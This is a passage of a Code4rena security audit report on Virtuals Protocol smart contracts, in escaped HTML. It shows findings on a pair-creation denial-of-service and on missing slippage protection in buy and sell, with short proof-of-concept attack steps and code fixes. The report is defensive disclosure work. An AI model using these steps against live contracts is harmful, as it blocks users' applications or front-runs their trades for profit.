steps:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003einitFromToken()\u003c/code\u003e, where the user populates registration with required metadata.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eexecuteApplication()\u003c/code\u003e, where the application is executed, setting up agent token, dao and provision liquidity on uniswap v2.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eWhen an application is executed in \u003ccode\u003eexecuteApplication()\u003c/code\u003e, the contract will check whether the agent token is custom or not. When the agent token is custom, the contract will skip agent token creation step and instead directly create a new pair on uniswap v2 for liquidity provisioning. To prevent the user from provisioning liquidity before execution, the \u003ccode\u003e_createPair()\u003c/code\u003e internal function will check the existence of the pair. But this check is not enough because any user can permissionlessly create a new pair without provisioning liquidity. This condition can be used by attacker to prevent user from executing application by simply creating a transaction that calls \u003ccode\u003euniswapV2Factory.createPair(agentToken, assetToken)\u003c/code\u003e before the victim calls \u003ccode\u003eexecuteApplication()\u003c/code\u003e. The execution will fail because the check \u003ccode\u003erequire(factory.getPair(tokenAddr, assetToken) == address(0), \"pool already exists\");\u003c/code\u003e will revert since the pair is already created by the attacker in the previous transaction.\u003c/p\u003e\n\u003ch3 id=\"impact-2\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eUser that register through \u003ccode\u003einitFromToken()\u003c/code\u003e unable to execute the application.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-4\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eThe attacker monitor the transaction that calls \u003ccode\u003eagentFactoryV4.initFromToken()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eBack-run that transaction with a transaction that calls \u003ccode\u003euniswapV2Factory.createPair(agentToken, assetToken)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eexecuteApplication()\u003c/code\u003e now will revert with pool exists error for the given application id.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended Mitigation Steps\u003c/h3\u003e\n\u003cp\u003eSimply verifying \u003ccode\u003euniswapV2Factory.getPair(tokenAddr, assetToken) == address(0))\u003c/code\u003e is not enough. When the token pair exists, it is crucial to check if the \u003ccode\u003etotalSupply\u003c/code\u003e of LP token is equal to 0. By doing that, we can make sure that there is no liquidity provisioned before the execution.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"38\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction _createPair(address tokenAddr) internal returns (address uniswapV2Pair_) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    IUniswapV2Factory factory = IUniswapV2Factory(IUniswapV2Router02(_uniswapRouter).factory());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   uniswapV2Pair_ = uniswapV2Factory.getPair(tokenAddr, assetToken);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   // valid only if the pair doesn\u0026#39;t exist or the total supply of the pair is 0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   require((uniswapV2Pair_ == address(0)) || (IUniswapV2Pair(uniswapV2Pair_).totalSupply() == 0), \u0026quot;pool already exists\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-   require(factory.getPair(tokenAddr, assetToken) == address(0), \u0026quot;pool already exists\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   if(uniswapV2Pair_ == address(0)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       uniswapV2Pair_ = factory.createPair(tokenAddr, assetToken);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    return (uniswapV2Pair_);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-02-missing-slippage-protection-on-buy-and-sell\" style=\"position:relative;\"\u003e\u003ca href=\"#m-02-missing-slippage-protection-on-buy-and-sell\" aria-label=\"m 02 missing slippage protection on buy and sell permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-4\"\u003e[M-02] Missing slippage protection on buy and sell\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-718\"\u003eEPSec\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-308\"\u003e0x1982us\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-633\"\u003e0x60scs\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-338\"\u003e0xbc000\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-550\"\u003e0xterrah\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-238\"\u003eadam-idarrha\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-286\"\u003eb1n4ry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-618\"\u003ebareli\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-371\"\u003eBlackAdam\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-313\"\u003eBowTiedOriole\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-488\"\u003ebytesguard\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-743\"\u003echupinexx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-197\"\u003eclassic-k\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-611\"\u003eCoheeYang\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-589\"\u003eDamola0x\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-139\"\u003edanzero\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-495\"\u003eEjineroz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-787\"\u003eEniwealth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-448\"\u003egregom\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-842\"\u003eharsh123\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-721\"\u003ejamshed\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-320\"\u003eJeremias\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-582\"\u003eKweks\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-417\"\u003emihailvichev\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-565\"\u003engo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-690\"\u003eNHristov\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-680\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-462\"\u003ePotEater\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-264\"\u003epro_king\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-830\"\u003eRorschach\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-822\"\u003eSeveritySquad\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-133\"\u003eShinobi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-333\"\u003eshui\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-438\"\u003eslowbugmayor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-210\"\u003eThanatOS\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-256\"\u003eTheCarrot\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-235\"\u003eVemus\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-503\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-532\"\u003ezubyoz\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L95-L163\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L95-L163\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-2\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-2\" aria-label=\"finding description 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003esell\u003c/code\u003e and \u003ccode\u003ebuy\u003c/code\u003e functions in the \u003ccode\u003eFRouter\u003c/code\u003e contract lack a slippage check to ensure that the \u003ccode\u003eamountOut\u003c/code\u003e (the amount of tokens received after the trade) is not less than a certain percentage of the expected \u003ccode\u003eamountOut\u003c/code\u003e. Slippage occurs when the price of a token changes between the time a transaction is submitted and when it is executed, often due to low liquidity or high volatility.\u003c/p\u003e\n\u003ch3 id=\"impact-3\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eUser Losses\u003c/strong\u003e: Without a slippage check, users may receive significantly fewer tokens than expected, especially in volatile markets or low-liquidity pools.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFront-Running Attacks\u003c/strong\u003e: Malicious actors can exploit the lack of a slippage check by front-running transactions, manipulating the reserves to cause unfavorable price changes for the user.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReduced Trust\u003c/strong\u003e: Users may lose confidence in the platform if they experience unexpected losses due to slippage, harming the platform’s reputation.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEconomic Exploits\u003c/strong\u003e: Arbitrageurs or bots could exploit the lack of slippage protection to profit at the expense of users, draining liquidity from the pool.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"proof-of-concept-5\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eDeploy the \u003ccode\u003eFRouter\u003c/code\u003e contract and initialize it with a factory and asset token.\u003c/li\u003e\n\u003cli\u003eSet up a pair with low liquidity between \u003ccode\u003eTokenA\u003c/code\u003e and the asset token.\u003c/li\u003e\n\u003cli\u003eCall the \u003ccode\u003esell\u003c/code\u003e or \u003ccode\u003ebuy\u003c/code\u003e function with a large \u003ccode\u003eamountIn\u003c/code\u003e during a period of high volatility or low liquidity.\u003c/li\u003e\n\u003cli\u003eObserve that the \u003ccode\u003eamountOut\u003c/code\u003e received is significantly lower than expected, with no mechanism to revert the transaction.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended Mitigation Steps\u003c/h3\u003e\n\u003cp\u003eTo address this issue, add a slippage check in both the \u003ccode\u003esell\u003c/code\u003e and \u003ccode\u003ebuy\u003c/code\u003e functions. The functions should accept a \u003ccode\u003eminAmountOut\u003c/code\u003e parameter, which specifies the minimum acceptable \u003ccode\u003eamountOut\u003c/code\u003e. If the actual \u003ccode\u003eamountOut\u003c/code\u003e is less than \u003ccode\u003eminAmountOut\u003c/code\u003e, the transaction should revert.\u003c/p\u003e\n\u003cp\u003eExample fix for the \u003ccode\u003esell\u003c/code\u003e function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esell\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Add a parameter for slippage protection\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEXECUTOR_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Zero addresses are not allowed.\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Zero addresses are not allowed.\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIFPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan 